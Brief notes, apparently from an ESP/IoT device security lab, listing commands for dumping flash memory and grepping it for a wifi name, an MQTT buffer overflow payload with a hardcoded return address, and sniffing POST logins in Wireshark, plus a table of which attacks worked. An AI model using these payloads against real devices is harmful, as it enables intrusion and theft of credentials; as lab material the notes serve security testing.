```
Flash Dump
esptool -p /dev/cu.usbserial-A5069RR4 --baud 115200 read-flash 0 0x200000 esp1.bin
strings esp1.bin | grep -A 5 "wifinaam"
```

```
Buffer overflow
mosquitto_pub -h 192.168.1.181 -t "device/rename" -m "$(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*32 + b"\x04\x93\x0d\x40")')"
```

```
Wifi sniffing
Wireshark => lo0
http.request.method == "POST"
inloggen op de site
```

PoC             |   Werkt?
Wifi Sniffing   |   Ja
MQTT DoS        |   Ja
UART SQL-I      |   Ja?
BLE MitM        |   BLE werkt, MitM half?
Rogue Library   |   Ja
Rogue Wifi / OTA|   Nee
Buffer Overflow |   Ja
Flash Dump      |   Ja
